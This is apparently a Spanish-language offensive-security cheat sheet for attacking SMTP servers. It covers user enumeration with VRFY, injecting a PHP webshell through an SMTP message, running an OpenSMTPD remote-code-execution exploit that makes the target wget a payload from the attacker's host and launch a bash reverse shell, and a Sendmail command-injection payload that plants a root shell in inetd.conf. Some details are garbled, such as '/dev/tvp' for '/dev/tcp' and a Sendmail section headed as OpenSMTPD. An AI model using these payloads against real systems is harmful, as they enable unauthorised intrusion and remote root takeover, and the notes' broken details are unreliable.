# SMTP 

Tags: #SMTP

```bash
❯ snmp-check IP    # 
```

```bash 
❯ smtp_user_enum -M VRFY -U users.txt -t ❮IP❯ # Ataque de Fuerza bruta para identificar usuarios 

	# VRFY = Verificar una lista de usuarios 
	# U = Lista de usuarios 
```

```bash 
❯ telnet <IP> 25              # Conectar al servicio SMTP
	❯ HELP                    # Mostrar los comandos a ingresar 
	❯ HELO test.com           # Mandar un saludo y ver la respuesta del servicio 
	❯ VRFY user               # Verificar si un usuario existe y poderlos enumerar
	❯ EXPN user               # Mostrar la actual dirección de envio del alias 
	
	❯ MAIL FROM: root         # Definir el remitente del mensaje
	❯ RCPT TO: Omar           # Definir el destinatario de un mensaje

	❯ AUTH LOGIN              # Para autenticarte
		❯ YryRIwfui54         # Agregar el usuario y dominio 'administrator@test.com' en base64
		❯ Yonf6hU7Vop         # Colocar la password en base64 

	❯ QUIT                    # Salir de la sesión 
```

## Enviar código PHP en SMTP

```bash 
# Si el servidor SMTP no requiere autenticación puede ser vulnerable a envio de código PHP para obtener una Webshell  

❯ telnet <IP> 25               # Conectarnos al servicio SMTP

	❯ MAIL FROM: Admin        # Primero se define el remitente del mensaje
	❯ RCPT TO: Omar           # Definir el destinatario de un mensaje
	❯ DATA                    # Indica que se enviará data en el mensaje 
		❯ <?php system($_GET['cmd']);      # Data que se enviará. Nota: Terminar el comando de PHP '?>' 
		❯ .                  # El punto indica que se termina la data a enviar
	❯ QUIT                    # Salir 

Nota:
	1. La cmd se encontrará en la web '/var/mail/dir?cmd=whoami'
```

## Explotar SMTP - Mercury/32
```bash 
❯ 
```


## Explotar OpenSMTPD - Versión < 6.6.2

```bash 
# El script de la versión < 6.6.1 es vulnerable 

❯ searchsploit opensmntpd     # Escoger el que se llama 'Remote Code Execution - 47984.py'
	# Descargar el exploit con el parametro '-m'


❯ python3 opensmtpd.py IP 25 'wget IP'        # Ejecutar el exploit y ver si hay conectividad 
	# port = 25 
	# IP = Dirección IP de Kali 
❯ python3 opensmtpd.py IP 25 'wget IP -O /dev/shm/rev'    # Exportar el archivo a la ruta 
❯ python3 opensmtpd.py IP 25 'bash /dev/shm/rev'          # Crear la Revershell 


Notas:
	1. Opcional: Si no funciona, modificar el 'Payload sent' y agregar un usuario valido en 'RCPT TO:<root>' en el exploit 
	2. Compartir el archivo que contiene la revershell con python 'python3 -m http.server 80'
	3. Antes de ejecutar el tercer comando, se deb de estar en modo escucha con 'Netcat'
```

```bash 
❯ nano index.html        # Archivo con la revershell 
	#!/bin/bash 
	bash -i >& /dev/tvp/IP/443 0>&1


NOTA:
	- A veces se usa el puerto 80 (o 443) porque las reglas de salida del firewall solo permiten tráfico por esos puertos
```

## Explotar OpenSMTPD - Versión 8.13.4 (Debian Sarge)

* [CVE-2007-4560](https://github.com/strikoder/sendmail-clamav-exploit-CVE-2007-4560)
* [RCE](https://www.exploit-db.com/exploits/4761)

```bash 
❯ python3 explit.py IP
# Usar el exploit es ma manera mas fácil
# Esto funciona si Sendmail es vulnerable a command injection y corre como root 

# Forma manual 
❯ nc IP 25    # Conectarse al puerto 
	❯ helo test 
	❯ MAIL FROM: <>
	❯ RCPT TO: <nobody+"|echo '1002 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"@localhost>   
	# Inyección del comando 
	❯ RCPT TO: <nobody+"|/etc/init.d/inetd restart"@localhost>  
	# Reiniciar inetd 
	❯ DATA
		❯ test
		❯ .
		❯ QUIT 

# Conectarse de la siguiente manera:
❯ nc IP 1002
❯ bash -i       # Obtener una shell 
```